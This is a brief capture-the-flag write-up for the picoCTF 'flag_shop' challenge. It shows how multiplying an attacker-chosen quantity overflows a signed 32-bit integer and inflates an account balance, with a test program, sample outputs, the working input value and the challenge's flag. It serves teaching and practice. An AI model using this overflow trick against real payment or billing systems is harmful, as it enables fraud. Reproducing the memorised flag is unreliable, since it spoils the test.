# flag_shop

from `store.c`:  
scanf() reads integer  
**Approach:**  
Buy x number of fake flags to overflow integer 


```
int total_cost = 0;
total_cost = 900*number_flags;

// ...

account_balance = account_balance - total_cost;
```


## Explore integer values
signed 32-bit integer limit: `2^(32-1) - 1 = 2147483647`


```c
int main() {
    int number_flags = 2147483647;
    int account_balance = 0;
    int total_cost = 0;
    total_cost = number_flags * 900;
    account_balance = account_balance - total_cost;
    printf("total cost: %d\n", total_cost);
    printf("account balance: %d\n", account_balance);
    return 0;
}
```
```
total cost: -900
account balance: 900
```
-900, 900  


with `number_flags = 2147483648` 
output is `0, 0`  

with `number_flags = 2147483649` 
output is `900, -900`  

with `number_flags = 2147483646` 
output is `-1800, 1800`  

## Solution

Generate enough balance by buying fake flags in high quantity (i.e. `2937483647` gets you `1964572036`) to buy the real flag.

flag: `picoCTF{m0n3y_bag5_9c5fac9b}`